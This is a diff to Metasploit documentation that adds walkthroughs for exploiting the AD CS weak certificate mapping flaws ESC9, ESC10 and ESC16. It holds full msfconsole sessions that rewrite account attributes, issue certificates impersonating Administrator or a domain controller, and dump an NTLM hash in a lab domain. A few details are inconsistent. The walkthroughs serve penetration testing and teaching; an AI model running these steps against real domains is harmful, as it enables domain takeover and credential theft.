@@ -14,6 +14,11 @@ flowchart TD
         ESC8(ESC8)
         ESC8 --> web_enrollment[<i>Issuance via Web Enrollment</i>]
     end
+    subgraph esc_update_ldap_object[<b>esc_update_ldap_object</b>]
+        ESC9(ESC9) --> weak_certificate_mapping[<i>Issuance via Weak Certificate Mapping</i>]
+        ESC10(ESC10) --> weak_certificate_mapping[<i>Issuance via Weak Certificate Mapping</i>]
+        ESC16(ESC16) --> weak_certificate_mapping[<i>Issuance via Weak Certificate Mapping</i>]
+    end
     subgraph icpr_cert[<b>icpr_cert</b>]
         ESC1(ESC1)
         ESC2(ESC2)
@@ -51,6 +56,8 @@ flowchart TD
     update_template --> ESC1
     web_enrollment --> PKINIT
     web_enrollment --> SCHANNEL
+    weak_certificate_mapping --> PKINIT
+    weak_certificate_mapping --> SCHANNEL
 ```
 
 The chart above showcases how one can go about attacking each of the AD CS vulnerabilities supported by Metasploit,
@@ -94,11 +101,13 @@ Later, additional techniques were disclosed by security researchers:
   `StrongCertificateBindingEnforcement` not set to 2 or `CertificateMappingMethods` contains `UPN` flag.
   - [Certipy 4.0: ESC9 & ESC10, BloodHound GUI, New Authentication and Request Methods — and
     more!](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
+  - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc9]]
 - ESC10 - Weak Certificate Mappings - `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel
   CertificateMappingMethods` contains `UPN` bit aka `0x4` or `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
   StrongCertificateBindingEnforcement` is set to `0`.
   - [Certipy 4.0: ESC9 & ESC10, BloodHound GUI, New Authentication and Request Methods — and
     more!](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
+  - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc10]]
 - ESC11 - Relaying NTLM to ICPR - Relaying NTLM authentication to unprotected RPC interface is allowed due to lack of
   the `IF_ENFORCEENCRYPTICERTREQUEST` flag on `Config.CA.Interface.Flags`.
   - [Relaying to AD Certificate Services over
@@ -115,9 +124,10 @@ Later, additional techniques were disclosed by security researchers:
   manipulation
   - [EKUwu: Not just another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
   - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc15]]
-
-Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4, ESC8, ESC13 and ESC15. As such, this page only
-covers exploiting that subset of ESC flaws.
+- ESC16 - Security Extension Disabled on CA (Globally)
+  - [ESC16 - Security Extension Disabled on CA](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)
+Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4, ESC8, ESC9, ESC10, ESC13, ESC15 and ESC16.
+As such, this page only covers exploiting that subset of ESC flaws.
 
 Before continuing, it should be noted that ESC1 is slightly different than ESC2 and ESC3
 as the diagram notes above. This is because in ESC1, one has control over the
@@ -921,6 +931,369 @@ msf6 auxiliary(server/relay/esc8) >
 [*] Identity: MSFLAB\smcintyre - All targets relayed to
 ```
 
+# Overview of exploiting ESC9 and ESC10 with Metasploit
+
+ESC9 and ESC10 are similar certificate misconfiguration abuse techniques. They both involve having credentials of a
+user, say "user1", who has GenericWrite privileges over "user2". This allows an attacker as "user1" to update either the
+`userPrincipalName` or `dNSHostName` attribute of "user2". In order to update the attribute, we need to authenticate 
+via LDAP - which is a unique requirement compared to the  other ESC techniques and is why we have created a separated
+module called `esc_update_ldap_object`
+
+If the AD CS server is configured to allow "weak certificate mappings" when a user is requesting a certificate, the
+server will check the `userPrincipalName` or the `dNSHostName` of the requesting identity and then issue a certificate
+based on that value.  Therefore if we can update "user2"'s UPN to "Administrator" and then request a certificate on
+behalf of "user2" we can get an Administrator certificate (easy priv esc horay). That is the essence of both ESC9 and
+ESC10 minus a number of details we'll get into.
+
+It's also worth noting that the following registry keys and preventative measure and exploit techniques (ESC9 and 10) all stem from
+Microsoft attempts to patch CVE-2022–26923 (aka Certifried). During this effort they implemented the new
+`szOID_NTDS_CA_SECURITY_EXT` security extension for issued certificates, which will embed the `objectSid`
+property of the requester, to help facilitate "strong certificate mappings", along with the following registry keys
+and certificate template flags.
+
+## StrongCertificateBindingEnforcement
+Located in: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc`
+
+This registry key defines what is considered weak and strong certificate mappings for **Kerberos authentication**. Possible values:
+
+| Setting | Method                                                                                           | Strength assessment |
+| ------- |--------------------------------------------------------------------------------------------------|---------------------|
+| 0       | No strong certificate mapping checks are done                                                    | weak                |
+| 1       | Will use strong mapping if present though can be ignored if CT_FLAG_NO_SECURITY_EXTENSION is set | weak                |
+| 2       | Full Enforcement Mode (No weak mappings allowed)                                                 | strong              |
+
+In order to exploit these certificate misconfiguration we will need the value of  `StrongCertificateBindingEnforcement` to be either `0` or `1`.
+If the value is set to `2` we cannot exploit the misconfiguration using Kerberos authentication.
+
+## CertificateMappingMethods
+Located in: `HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel`
+
+This registry key defines what is considered weak and strong certificate mappings for **Schannel authentication**. Possible values:
+
+| Bit | Setting | Method                                | Strength assessment |
+| --- | ------- | ------------------------------------- | ------------------- |
+| 1   | 0x0001  | Subject/Issuer certificate mapping    | weak                |
+| 2   | 0x0002  | Issuer certificate mapping            | weak                |
+| 3   | 0x0004  | UPN certificate mapping               | weak                |
+| 4   | 0x0008  | S4U2Self certificate mapping          | strong              |
+| 5   | 0x0010  | S4U2Self explicit certificate mapping | strong              |
+| 1-5 | 0x001F  | All of the above values               | weak                |
+
+In order to exploit these certificate misconfiguration using Schannel authentication we will need the value of
+`CertificateMappingMethods` to be `UPN certificate mapping` (or `All the above values`)
+
+
+## CT_FLAG_NO_SECURITY_EXTENSION
+Certificate templates now include an attribute called `msPKI-Enrollment-Flag`. The `msPKI-Enrollment-Flag` attribute
+defines how certificate enrollment behaves by enabling or disabling specific behaviors via a bitmask of flags. If the
+attribute contains the value:`0x00080000` (aka `CT_FLAG_NO_SECURITY_EXTENSION`) then the `szOID_NTDS_CA_SECURITY_EXT`
+is not included and we can exploit weak certificate mappings even if `StrongCertificateBindingEnforcement` is set to 1.
+
+
+## Changing userPrincipalName vs dNSHostName
+Both can be used to exploit the certificate misconfiguration. It should be noted that normal users don't have a `dNSHostName`
+attribute, only machine accounts do.
+
+# Exploiting ESC9
+## ESC9 Scenario 1
+Pre-requisites:
+- `StrongCertificateBindingEnforcement` is set to `1` (if it's set to `0` exploitation will still work but technically you're exploiting ESC10 in that case)
+- A vulnerable certificate template has the `CT_FLAG_NO_SECURITY_EXTENSION` flag set. 
+- The same vulnerable template has the `SubjectAltRequireUPN` flag set.
+- The same vulnerable template has a client authentication EKU
+- We have credentials of a user who has `GenericWrite` privileges over another user that can enroll in the vulnerable template
+
+```
+msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
+...
+[+] Template: ESC9-Template
+[*]   Distinguished Name: CN=ESC9-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=kerberos,DC=issue
+[*]   Manager Approval: Disabled
+[*]   Required Signatures: 0
+[!]   Potentially vulnerable to: ESC9 (the template is in a vulnerable configuration but in order to exploit registry key StrongCertificateBindingEnforcement must not be set to 2)
+[*]   Notes:
+[*]     * ESC9: Template has msPKI-Enrollment-Flag set to 0x80000 (CT_FLAG_NO_SECURITY_EXTENSION) and specifies a client authentication EKU and user1 has write privileges over user2 and the template has a subjectAltName (UPN or DNS) requirement
+[*]  Certificate Template Write-Enabled SIDs:
+[*]     * S-1-5-21-2324486357-3075865580-3606784161-1602 (user1)
+[*]     * S-1-5-21-2324486357-3075865580-3606784161-1603 (user2)
+[*]     * S-1-5-11 (Authenticated Users)
+[*]   Certificate Template Enrollment SIDs:
+[*]     * S-1-5-21-2324486357-3075865580-3606784161-1602 (user1)
+[*]     * S-1-5-21-2324486357-3075865580-3606784161-1603 (user2)
+[*]     * S-1-5-11 (Authenticated Users)
+...
+```
+Now we can see the above template is possibly exploitable if the `StrongCertificateBindingEnforcement` is set to `1`. In 
+our case it is so we can proceed with exploitation. 
+
+We will set a number of datastore options in order to exploit ESC9
+in this scenario. We will set `RHOSTS` `CERT_TEMPLATE` `CA` as we normally would. `SMBUser`, `SMBPass` and `SMBDomain` 
+are the credentials of the user who has `GenericWrite` privileges over the `TARGET_USERNAME`.  In order to update the UPN of the
+target user we must connect to LDAP and so the datastore options `LDAPUsername`, `LDAPPassword` and `LDAPDomain`  are
+available however if they are left blank the SMB credentials will be use - note `LDAPRport` must be set in order to 
+connect however it defaults to 389.  
+
+The option `UPDATE_LDAP_OBJECT` is an enum that can be set to either `userPrincipalName`  or `dNSHostName` and must be
+set in order to instruct the module to attempt to exploit ESC9 or ESC10. We will set `UPDATE_LDAP_OBJECT` to
+`userPrincipalName` in this case and so we then must set `ALT_UPN` to `Administrator@kerberos.issue`.
+
+The module parses the value of `ALT_UPN` or `ALT_DNS` in order to update either attribute `userPrincipalName` or `dNSHostName` attribute.
+It's important for this scenario, when updating the UPN to omit the domain suffix from the UPN to avoid conflicts with
+other UPNs in the domain, which by default all contain the suffix. The UPN processing order will still allow the DC to
+map the UPN Administrator in our writable account to the actual administrator, making its impersonation possible.
+
+It's also important to note that after issuing the certificate we must revert the `userPrincipalName` of the
+`TARGET_USERNAME` back to the original value before attempting to use the certificate or the certificate will not work. 
+This is done automatically by the module. 
+
+In the following example, the ESC9-Template template is vulnerable to ESC9 and will yield a ticket for Administrator once complete. 
+
+```
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
+rhosts => 172.16.199.200
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CA kerberos-DC2-CA
+CA => kerberos-DC2-CA
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CERT_TEMPLATE ESC9-Template
+CERT_TEMPLATE => ESC9-Template
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser user1
+smbuser => user1
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbpass N0tpassword!
+smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbdomain kerberos.issue
+smbdomain => kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username "user2"
+target_username => user2
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT userPrincipalName
+UPDATE_LDAP_OBJECT => userPrincipalName
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set alt_upn Administrator@kerberos.issue
+alt_upn => Administrator@kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
+[*] Running module against 172.16.199.200
+[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName: Administrator
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
+[+] The operation completed successfully!
+[+] 172.16.199.200:445 - The requested certificate was issued.
+[*] 172.16.199.200:445 - Certificate Policies:
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.16.199.200:445 - Certificate UPN: Administrator@kerberos.issue
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250602105447_default_172.16.199.200_windows.ad.cs_197715.pfx
+[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName: Administrator
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
+[+] The operation completed successfully!
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > use ldap_login
+
+Matching Modules
+================
+
+   #  Name                               Disclosure Date  Rank    Check  Description
+   -  ----                               ---------------  ----    -----  -----------
+   0  auxiliary/scanner/ldap/ldap_login  .                normal  No     LDAP Login Scanner
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/ldap/ldap_login
+
+[*] Using auxiliary/scanner/ldap/ldap_login
+[*] The CreateSession option within this module can open an interactive session
+msf6 auxiliary(scanner/ldap/ldap_login) > set rhost 172.16.199.200
+rhost => 172.16.199.200
+msf6 auxiliary(scanner/ldap/ldap_login) > set LDAP::Auth schannel
+LDAP::Auth => schannel
+msf6 auxiliary(scanner/ldap/ldap_login) > set LDAP::CertFile /Users/jheysel/.msf4/loot/20250602105447_default_172.16.199.200_windows.ad.cs_197715.pfx
+LDAP::CertFile => /Users/jheysel/.msf4/loot/20250602105447_default_172.16.199.200_windows.ad.cs_197715.pfx
+msf6 auxiliary(scanner/ldap/ldap_login) > set SSL true
+[!] Changing the SSL option's value may require changing RPORT!
+SSL => true
+msf6 auxiliary(scanner/ldap/ldap_login) > run
+[+] Success: 'Cert File /Users/jheysel/.msf4/loot/20250602105447_default_172.16.199.200_windows.ad.cs_197715.pfx'
+[*] LDAP session 1 opened (172.16.199.1:63612 -> 172.16.199.200:389) at 2025-06-02 10:55:58 -0700
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Bruteforce completed, 1 credential was successful.
+[*] 1 LDAP session was opened successfully.
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ldap/ldap_login) > sessions -i -1
+[*] Starting interaction with 1...
+
+LDAP (172.16.199.200) > getuid
+[*] Server username: KERBEROS\Administrator
+```
+We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator`
+domain administrator. See the [Getting A Kerberos Ticket](#getting-a-kerberos-ticket) section for more information.
+
+
+## ESC9 Scenario 2
+Pre-requisites:
+- `StrongCertificateBindingEnforcement` is set to `1` (if it's set to `0` exploitation will still work but technically you're exploiting ESC10 in that case)
+- A vulnerable certificate template has the `CT_FLAG_NO_SECURITY_EXTENSION` flag set.
+- The same vulnerable template has the `SubjectAltRequireDNS` flag set. <--- (Difference 1/2 between pre-requisites in scenario 1 and 2)
+- The same vulnerable template has a client authentication EKU
+- We have credentials of a machine account who has `GenericWrite` privileges over another **machine account** that can enroll in the vulnerable template <--- (Difference 2/2 between pre-requisites in scenario 1 and 2)
+  - Only machine accounts can have the `dNSHostName` attribute set, so our "target_user" needs to be machine account and we can't 
+
+The option `UPDATE_LDAP_OBJECT` will now be set to `dNSHostName` and because only machine accounts have the `dNSHostName` attribute we will set our `TARGET_USER` to the machine account`Test1$` 
+We will be changing the `dNSHostName` of the machine account `Test1$` to `DC2.kerberos.issue` (`DC2` is the hostname of the domain controller) in hopes to impersonate the Domain Controller machine account.
+
+`CERT_TEMPLATE` will be set to `ESC9-Template-Dns` which is the same template as `ESC9-Template` but with the `SubjectAltRequireDNS` flag set instead of the `SubjectAltRequireUPN` flag.
+
+
+```
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > unset alt_upn
+Unsetting alt_upn...
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
+rhosts => 172.16.199.200
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
+ldaprport => 389
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username "Test2$"
+target_username => Test2$
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set alt_dns dc2.kerberos.issue
+alt_dns => dc2.kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT dnsHostName
+UPDATE_LDAP_OBJECT => dNSHostName
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CA kerberos-DC2-CA
+CA => kerberos-DC2-CA
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser "Test1$"
+smbuser => Test1$
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbpass N0tpassword!
+smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbdomain kerberos.issue
+smbdomain => kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
+[*] Running module against 172.16.199.200
+[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Attempting to delete attribute dNSHostName from CN=Test2,CN=Computers,DC=kerberos,DC=issue...
+[+] Successfully deleted attribute dNSHostName from CN=Test2,CN=Computers,DC=kerberos,DC=issue
+[+] The operation completed successfully!
+[-] 172.16.199.200:445 - Auxiliary aborted due to failure: bad-config: The ALT_UPN should not be set if UPDATE_LDAP_OBJECT is set to dNSHostName.
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > unset alt_upn
+Unsetting alt_upn...
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
+[*] Running module against 172.16.199.200
+[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of Test2$'s dNSHostName:
+[*] Attempting to update dNSHostName for CN=Test2,CN=Computers,DC=kerberos,DC=issue to dc2.kerberos.issue...
+[+] Successfully updated CN=Test2,CN=Computers,DC=kerberos,DC=issue's dNSHostName to dc2.kerberos.issue
+[+] The operation completed successfully!
+[+] 172.16.199.200:445 - The requested certificate was issued.
+[*] 172.16.199.200:445 - Certificate Policies:
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.16.199.200:445 - Certificate DNS: dc2.kerberos.issue
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250602110830_default_172.16.199.200_windows.ad.cs_006601.pfx
+[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Attempting to delete attribute dNSHostName from CN=Test2,CN=Computers,DC=kerberos,DC=issue...
+[+] Successfully deleted attribute dNSHostName from CN=Test2,CN=Computers,DC=kerberos,DC=issue
+[+] The operation completed successfully!
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > use admin/kerberos/get_ticket
+[*] Using action GET_TGT - view all 3 actions with the show actions command
+msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250602110830_default_172.16.199.200_windows.ad.cs_006601.pfx
+[*] Running module against 172.16.199.200
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250602110910_default_172.16.199.200_mit.kerberos.cca_378767.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for dc2$@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250602110910_default_172.16.199.200_mit.kerberos.cca_467439.bin
+[+] Found NTLM hash for dc2$: aad3b435b51404eeaad3b435b51404ee:e94f9c213b133b15a194099bc361cc58
+[*] Auxiliary module execution completed
+```
+
+# Exploiting ESC10
+## ESC10 Scenario 1
+Pre-requisites:
+- `StrongCertificateBindingEnforcement` is set to `0`
+- Because the above is set to `0` we don't need the `CT_FLAG_NO_SECURITY_EXTENSION` flag set on the vulnerable template
+- Other than the above, pre-requisites and exploitation are the exact same as ESC9 Scenario 1
+
+## ESC10 Scenario 2
+Pre-requisites: 
+- `CertificateMappingMethods` is set to `0x0004` (UPN certificate mapping) or `0x001F` (All of the above values)
+- The vulnerable template has the `SubjectAltRequireUPN` or `SubjectAltRequireDNS` (We can exploit either in this scenario)
+- The same vulnerable template has a client authentication EKU
+- We have credentials of a machine account who has `GenericWrite` privileges over another machine account that can enroll in the vulnerable template
+
+In this scenario we can only compromise accounts that do not already have a populated `userPrincipalName` attribute, such as machine accounts and the default domain administrator.
+In addition, because this registry key only applies to SChannel authentication we are forced to authenticate to LDAPS once we get a certificate.
+If the certificate doesn't work when attempting to authenticate to LDAPS try setting `StrongCertificateBindingEnforcement` to `2` to ensure you're 
+exploiting scenario 2 and getting a `.pfx` file made for SChannel authentication.
+
+```
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
+rhosts => 172.16.199.200
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
+ldaprport => 389
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username "user2"
+target_username => user2
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set alt_upn 'DC2$@kerberos.issue'
+alt_upn => DC2$@kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT userPrincipalName
+UPDATE_LDAP_OBJECT => userPrincipalName
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CA kerberos-DC2-CA
+CA => kerberos-DC2-CA
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CERT_TEMPLATE ESC10-Template
+CERT_TEMPLATE => ESC10-Template
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbdomain kerberos.issue
+smbdomain => kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbpass N0tpassword!
+smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser user1
+smbuser => user1
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
+[*] Running module against 172.16.199.200
+[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName:
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to DC2$...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to DC2$
+[+] The operation completed successfully!
+[+] 172.16.199.200:445 - The requested certificate was issued.
+[*] 172.16.199.200:445 - Certificate Policies:
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.1 (Server Authentication)
+[*] 172.16.199.200:445 -   * 1.3.6.1.4.1.311.20.2.2 (Smart Card Logon)
+[*] 172.16.199.200:445 - Certificate UPN: DC2$@kerberos.issue
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250602111206_default_172.16.199.200_windows.ad.cs_548486.pfx
+[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Attempting to delete attribute userPrincipalName from CN=user2,CN=Users,DC=kerberos,DC=issue...
+[+] Successfully deleted attribute userPrincipalName from CN=user2,CN=Users,DC=kerberos,DC=issue
+[+] The operation completed successfully!
+[*] Auxiliary module execution completed
+
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > use ldap_login
+[*] Using auxiliary/scanner/ldap/ldap_login
+[*] The CreateSession option within this module can open an interactive session
+
+msf6 auxiliary(scanner/ldap/ldap_login) > run rhosts=172.16.199.200 LDAP::Auth=schannel LDAP::CertFile=/Users/jheysel/.msf4/loot/20250602111206_default_172.16.199.200_windows.ad.cs_548486.pfx
+[+] Success: 'Cert File /Users/jheysel/.msf4/loot/20250602111206_default_172.16.199.200_windows.ad.cs_548486.pfx'
+[*] LDAP session 2 opened (172.16.199.1:63765 -> 172.16.199.200:389) at 2025-06-02 11:14:12 -0700
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Bruteforce completed, 1 credential was successful.
+[*] 1 LDAP session was opened successfully.
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ldap/ldap_login) > sessions -i -1
+[*] Starting interaction with 2...
+
+LDAP (172.16.199.200) > getuid
+[*] Server username: KERBEROS\DC2$
+```
+
+
 # Exploiting ESC13
 To exploit ESC13, we need to target a certificate that has an issuance policy linked to a universal group in Active
 Directory. Unlike some of the other ESC techniques, successfully exploiting ESC13 isn't necessarily guaranteed to yield
@@ -1083,6 +1456,136 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Finally, *this* certificate can be used to authenticate to Kerberos with the `kerberos/get_ticket` module.
+
+# Exploiting ESC16
+ESC16 refers to a CA-level misconfiguration where the SID security extension (OID `1.3.6.1.4.1.311.25.2)`, introduced in
+the May 2022 KB5014754 update, is globally disabled. This extension allows domain controllers to securely map
+certificates to user or computer SIDs for strong authentication.
+
+When this OID is listed under the CA’s `DisableExtensionList` registry key, which is located:
+`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>\`
+all certificates issued by the CA will lack the SID binding, making every template behave as though it has the 
+`CT_FLAG_NO_SECURITY_EXTENSION` flag (essentially ESC9).
+
+## ESC16 Scenario 1
+If domain controllers aren’t in Full Enforcement mode (`StrongCertificateBindingEnforcement` != 2), they fall back to
+weaker mapping methods like UPN or DNS from the certificate’s SAN potentially reintroducing risks similar to the
+Certifried vulnerability (CVE-2022-26923) or ESC9 however for our purposes given the `DisableExtensionList` is called 
+"ESC16 Scenario 1". The way you exploit ESC16 scenario 1 with Metasploit is identical to how you would exploit ESC9:
+
+```
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
+rhosts => 172.16.199.200
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
+ldaprport => 389
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username user2
+target_username => user2
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbdomain kerberos.issue
+smbdomain => kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbpass N0tpassword!
+smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser user1
+smbuser => user1
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set alt_upn Administrator@kerberos.issue
+alt_upn => Administrator@kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ca kerberos-dc2-ca
+ca => kerberos-dc2-ca
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set cert_template ESC16-Template
+cert_template => ESC16-Template
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
+[*] Running module against 172.16.199.200
+[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName:
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
+[+] The operation completed successfully!
+[+] 172.16.199.200:445 - The requested certificate was issued.
+[*] 172.16.199.200:445 - Certificate Policies:
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.16.199.200:445 - Certificate UPN: Administrator@kerberos.issue
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250603131001_default_172.16.199.200_windows.ad.cs_555632.pfx
+[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Attempting to delete attribute userPrincipalName from CN=user2,CN=Users,DC=kerberos,DC=issue...
+[+] Successfully deleted attribute userPrincipalName from CN=user2,CN=Users,DC=kerberos,DC=issue
+[+] The operation completed successfully!
+[*] Auxiliary module execution completed
+```
+
+With the certificate issued, the attacker can then use the `kerberos/get_ticket` module to obtain the hash of the admin user:
+```
+msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250603131001_default_172.16.199.200_windows.ad.cs_555632.pfx
+[*] Running module against 172.16.199.200
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250603131016_default_172.16.199.200_mit.kerberos.cca_593591.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for Administrator@kerberos.issue
